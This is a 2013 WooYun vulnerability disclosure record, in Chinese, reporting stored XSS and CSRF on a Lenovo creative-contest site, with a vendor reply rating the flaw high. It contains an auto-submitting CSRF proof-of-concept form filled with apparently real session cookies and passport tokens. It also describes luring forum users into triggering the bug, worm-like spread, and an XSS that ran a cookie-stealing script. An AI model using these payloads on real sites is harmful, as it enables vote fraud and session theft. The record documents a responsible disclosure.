{"id": 60614, "wybug_id": "wooyun-2013-042578", "wybug_title": "联想某分站一处存储型xss与csrf", "wybug_corp": "联想", "wybug_author": "小龙", "wybug_date": "2013-11-11 17:45", "wybug_open_date": "2013-12-26 17:46", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "5", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-11-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-11-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-12-26：\t细节向公众公开  简要描述： 小漏洞，大危害 详细说明：  1：光棍节到了，无聊的我去联想官网看下活动，有个联想创客大赛的活动，果断进去看看，是一个创意平台，那个赞的地方有csrf，去论坛伪装下我岂不是也是创意达人？http://lenovobbs.lenovo.com.cn/forum.php会员: 6799 6700最少有1000人点吧？最少的，最多的话就是2000好吧？可以抓住别人的心理，看看别人喜欢什么东西，比如说？  创意达人创作的多功能夜光联想笔记本，大家来看看， 这时就可以用 img标签伪装拉～。～ 也可以配合无限评论那个漏洞，去发，比如说遍历一下，一个遍历重复5，6次，百度如果抓到了链接，外面用户也会点击，哎，说多了都是泪，小漏洞，大危害，小洞变大洞，大洞蠕虫起来，不是闹着玩的构造poc：\n<html><body><form id=\"csrf\" name=\"csrf\" action=\"http://go.sohu.com/2013/innovator/uploadvote.php\" method=\"POST\"><input type=\"text\" name=\"inno_headpicurl\" value=\"http%3A%2F%2Fs2.t.itc.cn%2Fmblog%2Fresource%2F20133_28_15%2Fb0l4ov8553111870739.jpg\" /><input type=\"text\" name=\"vjuids\" value=\"3574a68e.142181db424.0.4fdd6a4a13f5b\" /><input type=\"text\" name=\"__gads\" value=\"ID=8638e5077ca306a7:T=1383384069:S=ALNI_MbHZ4K-TvlW_E8FD8MMHEtvlPEBwQ\" /><input type=\"text\" name=\"suvc\" value=\"97327302972673\" /><input type=\"text\" name=\"vjlast\" value=\"1383384069.1384068365.11\" /><input type=\"text\" name=\"PHPSESSID\" value=\"lpodp45iiklcgesqvor72bqua5\" /><input type=\"text\" name=\"weibo_msg_version\" value=\"201311111226\" /><input type=\"text\" name=\"IPLOC\" value=\"CN4452\" /><input type=\"text\" name=\"SUV\" value=\"1311021720475994\" /><input type=\"text\" name=\"ppinf\" value=\"2|1384145529|0|bG9naW5pZDowOnx1c2VyaWQ6MjE6cXFxMTg5ODM3OTkyQHNvaHUuY29tfHNlcnZpY2V1c2U6MjA6MTAwMTAwMDAwMDAwMDAwMDAwMDB8Y3J0OjEwOjIwMTMtMTEtMTF8ZW10OjE6MHxhcHBpZDo0OjEwMTl8dHJ1c3Q6MToxfHBhcnRuZXJpZDoxOjB8cmVsYXRpb246MDp8dXVpZDoxNjo2ODhiMjZmZGE5Njc0NzdzfHVpZDoxNjo2ODhiMjZmZGE5Njc0NzdzfHVuaXFuYW1lOjk6MTg5ODM3OTkyfA\" /><input type=\"text\" name=\"pprdig\" value=\"cK2MOcmovd5aWoGKh_Bw3G0K6WJnscZz2QHyKZptwFINWae9ZXbOW2OjfjOb1Bn-8_8I7mh5xA6QPtHLgbr4DPQXmWKb22UwRQccn8Ore3L797svovkttcEamFTV8ydIEdAT-IBnRuoF2b5ty02jb0wwDu_kUrhVzV4L5SQSHXE\" /><input type=\"text\" name=\"passport\" value=\"1|1384145529|0|dXNlcmlkOjIxOnFxcTE4OTgzNzk5MkBzb2h1LmNvbXxzZXJ2aWNldXNlOjIwOjEwMDEwMDAwMDAwMDAwMDAwMDAwfA|a|TYVtc0TIhX0gUXzhxfe_V_27gy6VY1cCmLcI4a9Eo5os97zrFUe96nkqEmQDuDw0P3L4fm76RlfriAEhOPwrdcgT69SZDkxvAR5VLJ3ODbw1YSoJxP0WATmunNUZuFCGftZO_2RF9PZ1r2TB1Zn0Y6OOyThN3wrccNLoH2BL0Y4\" /><input type=\"text\" name=\"spinfo\" value=\"c29odXxxcXExODk4Mzc5OTJAc29odS5jb218OTk5MTYxMDI=\" /><input type=\"text\" name=\"sucaccount\" value=\"cXFxMTg5ODM3OTkyQHNvaHUuY29t|189837992|||=v2=cOMykDQ3TTF5XOMxgHNvaHUuY29t|qqq189837992|\" /><input type=\"text\" name=\"spstatus\" value=\"0\" /><input type=\"text\" name=\"spsession\" value=\"OTk5MTYxMDJ8LTF8MTM4NjczNzYwMXxxcXExODk4Mzc5OTI=-mewMygB97oHUDnZ1+o6mfhA+0GE=\" /><input type=\"text\" name=\"_ga\" value=\"GA1.2.1895764569.1384145059\" /><input type=\"text\" name=\"ppmdig\" value=\"-11384165128918e58175d0d27d5dd3e948b25891bb\" /><input type=\"text\" name=\"work_id\" value=\"83920\" /><input type=\"submit\" value=\"submit\"></form><script>   document.long.submit();</script></body></html>\n拿我自己的做实验把。\n\n\n\n\n\n无限评论：\n\n   漏洞证明：  2： xss：\n\n\n\n\n\n如何触发？等我的作品显示在主页的时候你们说会不会触发？～。～自己幻想去吧，上到主页就是弹三次xss框，2个cookie框，1个获取cookie的平台代码也被执行，为了测试放了三个xss，无语鸟。。删除把，真显示在主页的话我就蛋疼鸟，设想这么多人投稿，必定有很多闲人，如果弹框内容是一些博彩或者什么的联想你们不怕吗，自己的客户被拉走拉，你还忍心吗？已有35680位创客参赛 已征83929件创客作品8万用户躺着中弹。。触发的地方：作品信息 作者信息 两个地方如下图：\n\n   修复方案：  这个没什么好说的，都是一些老漏洞了。习以为常，拒绝作弊手法，保护安全隐私以及利益，该修复就修复，就算是弄到自己的也要修复   版权声明：转载请注明来源 小龙@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2013-11-13 15:23 厂商回复： 感谢您对联想安全做出的贡献！我们将立即评估与修复相关漏洞 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}